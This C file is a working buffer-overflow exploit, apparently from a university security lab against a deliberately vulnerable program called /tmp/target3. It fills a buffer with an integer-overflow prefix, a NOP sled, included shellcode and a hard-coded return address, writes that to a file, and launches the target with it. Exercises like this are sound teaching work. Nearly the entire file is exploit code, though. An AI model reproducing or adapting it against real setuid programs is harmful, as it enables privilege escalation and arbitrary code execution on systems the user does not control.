#include <string.h>
#include <unistd.h>
#include "shellcode.h"
#include "write_xploit.h"

#define TARGET "/tmp/target3"
#define DEFAULT_FILE "/tmp/xploit3_output"
#define NOP 0x90

int main(void)
{
  size_t exploit_size = 24024 + 24; 
  char *exploit = malloc(exploit_size);

  memset(exploit, NOP, exploit_size);
  memcpy(exploit, "9223372036854776810,", 21);
  memcpy(exploit + 67, shellcode, sizeof(shellcode));
  u_int64_t ret_addr = 0x7ffffffe8f78;
  memcpy(exploit + 24028, &ret_addr, 8);

  write_xploit(exploit, exploit_size, DEFAULT_FILE);
  char *args[] = { TARGET, DEFAULT_FILE, NULL };
  char *env[] = { NULL };
  execve(TARGET, args, env);
  perror("execve failed");
  fprintf(stderr, "try running \"sudo make install\" in the targets directory\n");

  return 0;
}
